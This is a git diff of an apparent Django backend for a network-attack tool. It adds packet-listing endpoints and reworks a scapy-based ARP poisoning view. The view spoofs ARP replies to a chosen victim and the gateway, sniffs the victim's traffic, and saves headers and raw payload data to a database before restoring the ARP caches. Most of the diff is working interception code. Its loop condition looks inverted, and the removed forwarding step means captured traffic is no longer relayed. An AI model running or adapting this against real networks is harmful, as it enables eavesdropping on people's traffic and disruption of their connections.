@@ -7,6 +7,7 @@ from django.shortcuts import get_object_or_404
 from rest_framework.decorators import api_view
 from rest_framework.response import Response
 from .serializers import DeviceSerializer 
+from .serializers import PacketSerializer 
 from rest_framework import status
 from django.utils import timezone
 import concurrent.futures
@@ -16,11 +17,30 @@ from itertools import repeat
 import time
 
 COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,62078,8009,9080,1080,9000,88]
+isAttacking = False
 
 @api_view(['GET'])
 def DeviceList(request):
     devices = Device.objects.all()
     serializer = DeviceSerializer(devices, many=True)
+    return Response(serializer.data)
+
+@api_view(['GET'])
+def PacketProtocolAmount(request):
+    print("EHER")
+    packets = Packet.objects.all()
+    TCP = packets.filter(packet_type="TCP")
+    ARP = packets.filter(packet_type="ARP")
+    DNS = packets.filter(packet_type="DNS")
+    ICMP = packets.filter(packet_type="ICMP")
+    UDP = packets.filter(packet_type="UDP")
+    protocolAmounts = {"TCP":TCP.count(),"ARP":ARP.count(),"DNS":DNS.count(),"ICMP":ICMP.count(),"UDP":UDP.count()}
+    return Response(protocolAmounts)
+
+@api_view(['GET'])
+def PacketList(request):
+    packets = Packet.objects.all()
+    serializer = PacketSerializer(packets, many=True)
     return Response(serializer.data)
 
 def PortScanner(device):
@@ -140,6 +160,8 @@ def ArpPoisioning(request):
     gateway_ip = (request.data["gateway"])
     gateway = Device.objects.get(ip=gateway_ip)
     gateway_mac = (gateway.mac)
+    global isAttacking
+    isAttacking = (request.data["isAttacking"])
 
     print(gateway_mac)
     print(gateway_ip)
@@ -151,85 +173,152 @@ def ArpPoisioning(request):
     # psrc = source ip
     # op="who-has" makes it easier to read the ARP packet in wireshark
 
-    try:
-        while True: 
+    while isAttacking == False: 
 
-            # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
-            adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
-            scapy.send(adversaryARP_packet)
+        # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
+        adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
+        scapy.send(adversaryARP_packet)
 
-            # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
-            gatewayARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
-            scapy.send(gatewayARP_packet)
+        # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
+        gatewayARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
+        scapy.send(gatewayARP_packet)
 
-            # PacketList 
-            pcap = scapy.sniff(count=5)
-            for packet in pcap:
-                #print(packet.show())
-                if(packet.haslayer(scapy.IP)):
-                    IP_packet = packet.getlayer(scapy.IP)
-                    if(IP_packet.dst == adversary_ip or IP_packet.src == adversary_ip): # We only want to get packets frame the person we are attacking. there is no point on capturing our own data, it will only make things more crowded
-                        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-                        new_packet = Packet.objects.create()
-                        if(packet.haslayer(scapy.Ether)):
-                            # Ethernet Packet
-                            ETHERNET_frame = packet.getlayer(scapy.Ether)
-                            ETHERNET_frame_destination = ETHERNET_frame.dst
-                            ETHERNET_frame_source = ETHERNET_frame.src
+        # PacketList 
+        pcap = scapy.sniff(count=5)
+        for packet in pcap:
+            print(packet.show())
+            doSavePacket = False
+            if(packet.haslayer(scapy.ARP)): # ARP is layer 2, so we need to capture the frame before we go into the check if the frame has an IP layer
+                new_packet = Packet.objects.create()
+                # Ethernet Packet
+                ETHERNET_frame = packet.getlayer(scapy.Ether)
+                ETHERNET_frame_destination = ETHERNET_frame.dst
+                ETHERNET_frame_source = ETHERNET_frame.src
 
-                            # Put Ethernet Packet in Database
-                            new_packet.ethernet_destination = ETHERNET_frame_destination
-                            new_packet.ethernet_source = ETHERNET_frame_source
-                        if(packet.haslayer(scapy.IP)):
-                            # IP Packet
-                            IP_packet = packet.getlayer(scapy.IP)
-                            IP_packet_source = IP_packet.src
-                            IP_packet_destination = IP_packet.dst
+                # Put Ethernet Packet in Database
+                new_packet.ethernet_destination = ETHERNET_frame_destination
+                new_packet.ethernet_source = ETHERNET_frame_source
 
-                            # Put IP Packet in Database
-                            new_packet.ip_destination = IP_packet_destination
-                            new_packet.ip_source = IP_packet_source
-                        if(packet.haslayer(scapy.TCP)):
-                            # TCP Packet
-                            tcp_packet = packet.getlayer(scapy.TCP)
-                            TCP_source_port = tcp_packet.sport
-                            TCP_destination_port = tcp_packet.dport
-                            TCP_flag = tcp_packet.flags
+                # ARP Packet
+                arp_packet = packet.getlayer(scapy.ARP)
+                ARP_source_mac = arp_packet.hwsrc
+                ARP_destination_mac = arp_packet.hwdst
+                ARP_source_ip = arp_packet.psrc
+                ARP_destination_ip = arp_packet.pdst
 
-                            # Put TCP Packet in Database
-                            new_packet.tcp_destination_port = TCP_destination_port
-                            new_packet.tcp_source_port = TCP_source_port
-                            new_packet.tcp_flag = TCP_flag
-                        print("SAVING TO DATABASE")
+                # Put dest and src Packet in Database
+                new_packet.ip_destination = arp_packet.pdst
+                new_packet.ip_source = arp_packet.psrc
+
+                # Put ARP Packet in Database
+                new_packet.arp_source_mac = ARP_source_mac
+                new_packet.arp_destination_mac = ARP_destination_mac
+                new_packet.arp_source_ip = ARP_source_ip
+                new_packet.arp_destination_ip = ARP_destination_ip
+
+                new_packet.packet_type = "ARP"
+                new_packet.save()
+            if(packet.haslayer(scapy.IP)):
+                IP_packet = packet.getlayer(scapy.IP)
+                if(IP_packet.dst == adversary_ip or IP_packet.src == adversary_ip): # We only want to get packets frame the person we are attacking. there is no point on capturing our own data, it will only make things more crowded
+                    new_packet = Packet.objects.create()
+                    if(packet.haslayer(scapy.Ether)):
+                        # Ethernet Packet
+                        ETHERNET_frame = packet.getlayer(scapy.Ether)
+                        ETHERNET_frame_destination = ETHERNET_frame.dst
+                        ETHERNET_frame_source = ETHERNET_frame.src
+
+                        # Put Ethernet Packet in Database
+                        new_packet.ethernet_destination = ETHERNET_frame_destination
+                        new_packet.ethernet_source = ETHERNET_frame_source
+                    if(packet.haslayer(scapy.IP)):
+                        # IP Packet
+                        IP_packet = packet.getlayer(scapy.IP)
+                        IP_packet_source = IP_packet.src
+                        IP_packet_destination = IP_packet.dst
+
+                        # Put IP Packet in Database
+                        new_packet.ip_destination = IP_packet_destination
+                        new_packet.ip_source = IP_packet_source
+                    if(packet.haslayer(scapy.TCP)):
+                        # TCP Packet
+                        tcp_packet = packet.getlayer(scapy.TCP)
+                        TCP_source_port = tcp_packet.sport
+                        TCP_destination_port = tcp_packet.dport
+                        TCP_flag = tcp_packet.flags
+
+                        # Put TCP Packet in Database
+                        new_packet.tcp_destination_port = TCP_destination_port
+                        new_packet.tcp_source_port = TCP_source_port
+                        new_packet.tcp_flag = TCP_flag
+
+                        new_packet.packet_type = "TCP"
+                        doSavePacket = True
+
+                        if(packet.haslayer(scapy.Raw)):
+                            # RAW Packet
+                            raw_packet = packet.getlayer(scapy.Raw)
+
+                            # Put RAW Packet in Database
+                            new_packet.raw_packet_data = raw_packet
+
+
+                    if(packet.haslayer(scapy.UDP)):
+                        # UDP Packet
+                        udp_packet = packet.getlayer(scapy.UDP)
+                        UDP_source_port = udp_packet.sport
+                        UDP_destination_port = udp_packet.dport
+
+                        # Put UPP Packet in Database
+                        new_packet.udp_destination_port = UDP_destination_port
+                        new_packet.udp_source_port = UDP_source_port
+
+                        new_packet.packet_type = "UDP"
+                        doSavePacket = True
+
+                        if(packet.haslayer(scapy.Raw)):
+                            # RAW Packet
+                            raw_packet = packet.getlayer(scapy.Raw)
+
+                            # Put RAW Packet in Database
+                            new_packet.raw_packet_data = raw_packet
+
+
+                    if(packet.haslayer(scapy.ICMP)):
+                        # ICMP Packet
+                        icmp_packet = packet.getlayer(scapy.ICMP)
+
+                        # Put ICMP Packet in Database
+                        new_packet.icmp_packet_type = icmp_packet.type
+
+                        new_packet.packet_type = "ICMP"
+                        doSavePacket = True
+                    
+                    if(packet.haslayer(scapy.DNS)):
+                        # DNS Packet
+                        dns_packet = packet.getlayer(scapy.DNS)
+                        dns_packet_opcode = dns_packet.opcode
+                        dns_packet_qd = dns_packet.qd
+
+                        # Put DNS Packet in Database
+                        new_packet.dns_packet_opcode = dns_packet_opcode
+                        new_packet.dns_packet_qd = dns_packet_qd.getlayer(scapy.DNSQR).qname
+
+                        new_packet.packet_type = "DNS"
+                        doSavePacket = True
+                    print("SAVING TO DATABASE")
+                    if doSavePacket:
                         new_packet.save()
                 
-                
-                # forward the packets the we are intercepting to the correct recipient
-                if(packet.getlayer(scapy.Ether).src == gateway_mac):
-                    # change destination MAC to adversary because we intercepted a packet going from the gateway to the adversary
-                    packet.getlayer(scapy.Ether).dst = adversary_mac
-                    scapy.send(packet)
-                elif(packet.getlayer(scapy.Ether).src == adversary_mac):
-                    # change destination MAC to gateway because we intercepted a packet going from the adversary to the gateway
-                    packet.getlayer(scapy.Ether).dst = gateway_mac
-                    scapy.send(packet)
 
+    # reset the ARP cache table for the device being attacked and the gateway
+    # This packet is sending an ARP request to the gateway saying the correct location of the MAC address I am trying to fix
+    fixARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip, hwsrc=adversary_mac)
+    scapy.send(fixARP_packet)
 
-
-                
-                
-                    
-    except KeyboardInterrupt:
-        print("Closing")
-
-    # (Note): The ARP Packet will contain the hwsrc of the computer that the ARP packet is being sent from.
-    # ARP PACKET
-        # pdst = Destination IP
-        # psrc = Source IP
-        # hwdst = Desination MAC
-        # hwsrc = Source MAC (This is not explicitly set in the packet, but it will be set to the MAC address of the computer sending the ARP packet)
-    # Since ARP will resolve IP addresses to MAC addresses, the ARP packet will make the recipient think that that the IP address of psrc belongs to the MAC address of hwsrc. That's how the attack works.
-
+    # This packet is sending an ARP request to the device I want to fix saying the correct location of the gateway
+    fixARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    scapy.send(fixARP_packet)
     return Response(status=200)
     
 
